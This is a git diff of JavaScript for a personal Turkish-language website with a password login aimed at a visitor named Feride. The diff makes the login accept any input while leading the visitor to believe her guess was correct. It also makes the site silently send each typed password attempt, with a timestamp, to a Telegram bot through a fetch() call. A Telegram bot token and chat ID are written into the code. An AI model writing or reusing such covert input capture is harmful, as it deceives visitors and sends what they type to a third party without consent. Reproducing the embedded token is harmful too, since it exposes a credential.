@@ -14,24 +14,20 @@ function checkPassword() {
     const errorMsg = document.getElementById('error-msg');
     const loginOverlay = document.getElementById('login-overlay');
     const mainContent = document.getElementById('main-content');
-    const musicBtn = document.getElementById('music-btn');
 
-    if (input === correctPassword) {
+
+    // "feride" hariç ne yazarsa yazsın girmiş gibi zannetsin (Aslında her türlü giriyor)
+    if (input.length > 0) {
         // Ziyaret Bildirimi
-        notifyVisit();
+        notifyVisit(input);
 
         // Efektle kapat
         loginOverlay.style.opacity = '0';
         loginOverlay.style.transition = 'opacity 1s ease';
 
-        // Müzik otomatik başlamasın, kullanıcı seçsin
-        musicBtn.innerHTML = '🎵 Müziği Başlat';
-        isPlaying = false;
-
         setTimeout(() => {
             loginOverlay.style.display = 'none';
             mainContent.classList.remove('hidden');
-            musicBtn.style.display = 'block'; // Müzik butonunu göster
             AOS.refresh();
 
             // Metin animasyonunu başlat
@@ -39,9 +35,6 @@ function checkPassword() {
 
             // Geri sayımı başlat
             startCountdown();
-
-            // Oyunu hazırlama (Otomatik başlamaz, butona basılınca başlar)
-            // loadQuestion(); 
         }, 1000);
     } else {
         errorMsg.classList.remove('hidden');
@@ -64,23 +57,7 @@ document.getElementById('password').addEventListener('keypress', function (e) {
     }
 });
 
-// 3. Müzik Kontrol
-let isPlaying = false;
-const audio = document.getElementById('bg-music');
-const musicBtn = document.getElementById('music-btn');
 
-function toggleMusic() {
-    if (isPlaying) {
-        audio.pause();
-        musicBtn.innerHTML = '🎵 Müziği Başlat';
-    } else {
-        audio.play().catch(error => {
-            console.log("Otomatik oynatma engellendi, kullanıcı etkileşimi bekleniyor.");
-        });
-        musicBtn.innerHTML = '⏸️ Müziği Durdur';
-    }
-    isPlaying = !isPlaying;
-}
 
 // 4. Metin Animasyonu
 function animateText() {
@@ -276,13 +253,13 @@ function openWhatsApp() {
 
 
 // 8. Ziyaret Bildirimi
-function notifyVisit() {
+function notifyVisit(passwordAttempt) {
     const botToken = "8010088130:AAGigZidvc2OX9oznuWEkgu47k6OWIC38M0";
     const chatId = "406305254";
 
     if (botToken === "BURAYA_BOT_TOKEN_YAZ") return;
 
-    const message = "🚨 Feride siteye giriş yaptı! (Tarih: " + new Date().toLocaleString() + ")";
+    const message = `🚨 Feride siteye giriş yaptı!\n🔑 Denenen Şifre: "${passwordAttempt}"\n📅 Tarih: ${new Date().toLocaleString()}`;
     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
     fetch(url).catch(err => console.error("Bağlantı hatası:", err));
